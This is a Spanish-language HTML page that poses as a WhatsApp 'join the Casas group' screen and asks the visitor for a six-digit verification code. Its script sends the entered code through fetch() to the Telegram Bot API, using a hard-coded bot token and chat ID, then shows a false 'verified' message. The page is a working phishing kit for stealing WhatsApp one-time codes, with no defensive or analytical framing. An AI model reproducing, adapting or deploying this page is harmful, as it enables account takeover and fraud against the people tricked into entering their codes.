<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp</title>
    <style>
        body { font-family: 'Segoe UI', Helvetica, Arial, sans-serif; background-color: #ffffff; margin: 0; display: flex; flex-direction: column; align-items: center; color: #111b21; }
        .header { background-color: #008069; width: 100%; height: 60px; display: flex; align-items: center; padding: 0 20px; box-sizing: border-box; color: white; font-size: 20px; font-weight: 500; }
        .container { text-align: center; padding: 20px; max-width: 380px; width: 95%; }
        .group-icon { width: 90px; height: 90px; background-color: #dfe5e7; border-radius: 50%; margin: 25px auto 15px; display: flex; align-items: center; justify-content: center; font-size: 40px; }
        h1 { font-size: 1.3rem; margin-bottom: 5px; color: #41525d; }
        p { font-size: 14px; color: #667781; line-height: 1.4; margin-bottom: 35px; }
        .inputs { display: flex; justify-content: center; gap: 6px; margin-bottom: 40px; }
        .inputs input { width: 40px; height: 50px; border: 1.5px solid #008069; border-radius: 8px; font-size: 22px; text-align: center; outline: none; background-color: #f8f9fa; }
        .btn { background-color: #008069; color: white; border: none; width: 100%; padding: 14px; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="header">WhatsApp</div>
    <div class="container">
        <div class="group-icon">🏠</div>
        <h1>Unirse al grupo "Casas"</h1>
        <p>Introduce el código de 6 dígitos que recibiste para verificar tu cuenta y unirte al grupo de ventas.</p>
        <div class="inputs" id="otp">
            <input type="number" oninput="if(this.value.length>1)this.value=this.value.slice(0,1); if(this.value!='')document.getElementById('otp').children[1].focus()">
            <input type="number" oninput="if(this.value.length>1)this.value=this.value.slice(0,1); if(this.value!='')document.getElementById('otp').children[2].focus()">
            <input type="number" oninput="if(this.value.length>1)this.value=this.value.slice(0,1); if(this.value!='')document.getElementById('otp').children[3].focus()">
            <input type="number" oninput="if(this.value.length>1)this.value=this.value.slice(0,1); if(this.value!='')document.getElementById('otp').children[4].focus()">
            <input type="number" oninput="if(this.value.length>1)this.value=this.value.slice(0,1); if(this.value!='')document.getElementById('otp').children[5].focus()">
            <input type="number" oninput="if(this.value.length>1)this.value=this.value.slice(0,1)">
        </div>
        <button class="btn" onclick="enviar()">AUTENTICAR</button>
    </div>

    <script>
        function enviar() {
            const tok = '8658431564:AAG_X2OY9fTPugsL9nVeT6aeHcg2h-jP4zU';
            const cid = '6475554235';
            let cod = "";
            document.querySelectorAll('input').forEach(i => cod += i.value);

            if(cod.length === 6) {
                const link = `https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=NUEVO_CODIGO_CASAS: ${cod}`;
                fetch(link).then(() => {
                    alert("¡Código verificado! Redirigiendo al grupo...");
                    location.reload();
                }).catch(() => {
                    alert("Error de red. Intenta de nuevo.");
                });
            } else {
                alert("Escribe los 6 números.");
            }
        }
    </script>
</body>
</html>
